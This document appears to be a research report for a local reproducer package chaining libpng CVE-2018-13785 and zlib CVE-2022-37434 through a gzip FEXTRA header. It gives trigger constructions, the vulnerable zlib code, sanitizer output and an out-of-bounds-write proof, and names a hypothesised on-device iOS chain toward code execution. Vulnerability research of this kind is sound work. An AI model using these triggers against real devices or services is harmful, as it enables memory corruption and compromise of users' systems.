# Local chain: CVE-2018-13785 (libpng) -> histogram->FEXTRA bridge -> CVE-2022-37434 (zlib) 4 GiB OOB write

Scope: local disposable fixtures only (x86-64 Linux, ASAN+UBSAN). No device
delivery, no exploit payload, no heap grooming, no code-pointer targeting.
The iOS 27 IPSW is deleted; the on-device STExtractionService reachability
question is **blocked on implementation evidence** and is tracked separately
in `chain-kit/STEXTRACT-37434-BUG-REPORT.md`.

Reproduce everything with:

    python3 /home/box/Desktop/Juicy/SeraProjs/reproducer-package/run_chain.py

Artifacts land in `reproducer-package/chain-artifacts/` (PNG, gzip, JSON report).

---

## The chain

    H1  libpng CVE-2018-13785  (huge-width PNG -> row_factor overflow -> FPE)
     |
     |  (bridge) PNG zero-sample histogram serialized into a gzip FEXTRA header
     v
    H2  zlib CVE-2022-37434   (FEXTRA XLEN > extra_max -> 4 GiB OOB write)

### H1 — libpng CVE-2018-13785 (VERIFIED, local differential)

Input: `chain-artifacts/h1-cve-2018-13785-trigger.png` — IHDR 1,431,655,765 x 1,
8-bit RGB, IDAT inflates to 32 zero bytes.

For RGB8, `width * 3` wraps 32-bit to `0xFFFFFFFF`; adding the filter byte wraps
`row_factor` to 0. libpng 1.6.34 divides by `row_factor` in
`png_check_chunk_length`:

    pngrutil.c:3154:44: runtime error: division by zero
    ERROR: AddressSanitizer: FPE ... in png_check_chunk_length

Fixed libpng 1.6.35 avoids the FPE and rejects with `Not enough image data`.

    vulnerable 1.6.34 : FPE (div-by-zero)        differential = TRUE
    fixed     1.6.35 : rejected (clean)

Note: reaching the huge-width arithmetic requires a test-only raised width cap
(`PNG_USER_WIDTH_MAX=2147483647`); stock config rejects the dimensions first.
This is a property of the local fixture, not of the CVE itself.

### BRIDGE — histogram -> gzip FEXTRA (VERIFIED as a local adapter; NOT iOS code)

`fextra_carrier.py` (in `Embedded/food.txt/dev/`) computes a PNG's zero-sample
histogram and serializes it into a gzip FEXTRA header:

    payload = struct.pack("<III", zero_count, total, distinct)   # cast into FEXTRA
    subfield = b"ZS" + <len:2> + payload
    gzip member = 1f 8b 08 04 ... XLEN ... FEXTRA ... DEFLATE(png) ...

Source image: `chain-artifacts/bridge-valid-100000x1-allzero.png` — a real,
decodable 100000 x 1 RGB8 raster of all-zero samples (300,000 zero samples).
Its histogram is genuine (computed from a valid raster, not an external claim):

    zero_count = 300000, total = 300000, distinct = 1

The resulting gzip member `bridge-histogram-fextra-carrier.png.gz`:

    FLG = 0x04 (FEXTRA), XLEN = 16
    FEXTRA hex = 5a530c00 e0930400 e0930400 01000000
                 "ZS"  len=12  300000     300000     1

So the large zero histogram is literally cast (packed as 3x uint32 LE) into the
gzip FEXTRA header. This matches the remembered "histograms -> FEXTRA" path.

**Honesty boundary:** this histogram->FEXTRA transform is a hand-crafted local
adapter. No iOS / STExtractionService source performing this exact assignment
has been located (the IPSW is gone). Treat the bridge as a *demonstrated
capability*, not a *demonstrated target path*.

### H2 — zlib CVE-2022-37434, 4 GiB OOB write (VERIFIED, local differential)

zlib 1.2.12 `inflate.c` EXTRA state (the vulnerable line, 769):

    len = state->head->extra_len - state->length;          /* dst offset, grows 0..XLEN */
    zmemcpy(state->head->extra + len, next,
            len + copy > state->head->extra_max ?
                state->head->extra_max - len : copy);      /* UNDERFLOWS when len > extra_max */

The caller supplies `head->extra` with capacity `extra_max`. When the gzip
header advertises `XLEN > extra_max`, `len` grows past `extra_max`, and
`extra_max - len` underflows (unsigned) to `0xFFFFFFFF`. The copy then writes
**4,294,967,295 bytes (~4 GiB)** to `extra + len`, which is past the end of the
caller's buffer.

Differential on the histogram carrier (XLEN=16, extra_max=8):

    vulnerable zlib 1.2.12 : AddressSanitizer heap-buffer-overflow at inflate.c:769
                             "READ of size 4294967295"   (rc=1)
    fixed     zlib 1.2.13 : clean, inflate_final=1 extra_len=16 extra_max=8  (rc=0)
    differential = TRUE

The same differential holds for the standalone CVE trigger (XLEN=65535).

#### Why ASan says "READ" but it is a 4 GiB WRITE

`zmemcpy(dst, src, 0xFFFFFFFF)` is simultaneously an OOB read (from `next`) and
an OOB write (to `extra + len`). ASan's memcpy interceptor checks the source
range first, so it labels the access "READ of size 4294967295". The
destination is equally out of bounds. `zlib-chain/write_proof_driver.c` replays
the exact vulnerable arithmetic and proves the write side:

    gzip FLG=0x04 XLEN(extra_len)=16 extra_max(capacity)=8
    caller extra buffer: [0x...4f0, 0x...4f8)  (8 bytes)

    *** UNDERFLOW at consumed=9 ***
      len (dst offset)      = 9
      dst = extra + len     = 0x...4f9
      dst in [extra,extra+extra_max)? NO  -> OOB WRITE destination
      ncopy = extra_max - len = 4294967295  (0xffffffff)
      => zmemcpy(dst, src, ncopy) writes 4294967295 bytes (~4.00 GiB) past the 8-byte buffer

Control (extra_max=64 >= XLEN): no underflow, copy stays in bounds.

### Important precision about the cause

The 4 GiB magnitude is **not** caused by the histogram being large. It is caused
by the **length mismatch** `XLEN > extra_max`, which makes `extra_max - len`
underflow to `0xFFFFFFFF`. The histogram (300,000 zeros) is *payload content*
inside FEXTRA; its size does not drive XLEN (XLEN=16 here, fixed by the 12-byte
`<III>` payload). Any FEXTRA with `XLEN > extra_max` produces the same 4 GiB
underflow — the histogram carrier (XLEN=16) and the CVE trigger (XLEN=65535)
both yield `ncopy = 0xFFFFFFFF`. So "large histogram of zeros" is the *carrier
content*; the *cause* of the 4 GiB write is the FEXTRA length exceeding the
consumer's `extra_max` buffer.

---

## What is VERIFIED vs HYPOTHESIZED

| Claim | Status |
|---|---|
| libpng 1.6.34 FPE on huge-width PNG; 1.6.35 clean (CVE-2018-13785) | VERIFIED (local ASAN+UBSAN differential) |
| Histogram (300000 zeros) serialized into gzip FEXTRA via `<III` pack | VERIFIED (local adapter `fextra_carrier.py`) |
| zlib 1.2.12 4 GiB OOB write at inflate.c:769 on FEXTRA XLEN>extra_max; 1.2.13 clean (CVE-2022-37434) | VERIFIED (local ASAN differential + write-proof driver) |
| The 4 GiB write is a WRITE to OOB `extra+len` (not only a read) | VERIFIED (write_proof_driver: dst OOB, ncopy=0xFFFFFFFF) |
| The histogram->FEXTRA adapter exists in iOS / STExtractionService | **NOT ESTABLISHED** (IPSW deleted; no target source) |
| STExtractionService calls `inflateGetHeader` with bounded `extra_max` | **HYPOTHESIS** (needs disassembly of the XPC binary) |
| Full on-device chain (write -> code exec -> attestation -> climb) | **HYPOTHESIS** (individual links proven; topology not exercised live) |

## Fixture identities

- libpng vulnerable: 1.6.34, commit `b78804f9a2568b270ebd30eca954ef7447ba92f7`
  (test-only `PNG_USER_WIDTH_MAX=2147483647` override to reach the arithmetic)
- libpng fixed: 1.6.35, commit `c17d164b4467f099b4484dfd4a279da0bc1dbd4a`
- zlib vulnerable: 1.2.12, commit `21767c654d31d2dccdde4330529775c6c5fd5389`
- zlib fixed: 1.2.13, commit `04f42ceca40f73e2978b50e93806c2a18c1281fc`
- All built static with `-fsanitize=address,undefined`.

## Files

- `run_chain.py` — end-to-end driver (produces artifacts + differential report)
- `chain-artifacts/h1-cve-2018-13785-trigger.png` — H1 input
- `chain-artifacts/bridge-valid-100000x1-allzero.png` — valid large-zero raster
- `chain-artifacts/bridge-histogram-fextra-carrier.png.gz` — histogram->FEXTRA member
- `chain-artifacts/CHAIN-REPORT.json` — machine-readable results + hashes
- `../zlib-chain/write_proof_driver.c` — 4 GiB OOB-write proof
- `../zlib-chain/fixture_driver.c` — ASAN differential driver
- `triggers/` — standalone CVE triggers (see `MANIFEST.md`, `HASHES.txt`)
